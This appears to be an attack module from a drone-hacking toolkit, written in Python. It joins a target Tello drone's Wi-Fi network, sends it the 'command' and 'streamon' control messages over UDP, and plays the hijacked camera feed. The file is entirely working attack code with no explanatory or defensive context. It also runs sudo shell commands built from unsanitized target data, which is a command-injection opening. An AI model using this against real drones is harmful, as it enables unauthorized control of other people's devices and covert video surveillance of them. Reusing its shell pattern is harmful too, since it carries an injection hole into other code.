import os
import subprocess
import socket
import time

# Capture Target Information
module_input_file_path = os.path.dirname(__file__) + "/../modules/module_input_data.json"
target_information = None

with open(module_input_file_path, "r") as f:
    target_information = f.readlines()
    
##################
## START MODULE ##
##################

# Tello IP and port
tello_address = ('192.168.10.1', 8889)
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Define the command to send
command = 'command'
streamon = 'streamon'

subprocess.call(f"sudo iwconfig wlan0 channel {target_information[4]}",shell=True)

subprocess.call(f"sudo nmcli dev wifi connect {target_information[1]}", shell=True)

time.sleep(20)

# Send the command to the drone
sock.sendto(command.encode('utf-8'), tello_address)
sock.sendto(streamon.encode('utf-8'), tello_address)

print("Streamon command sent to Tello drone")

# Decode and play the stream
subprocess.call(f"ffplay -probesize 32 -i udp://@:11111 -framerate 30", shell=True)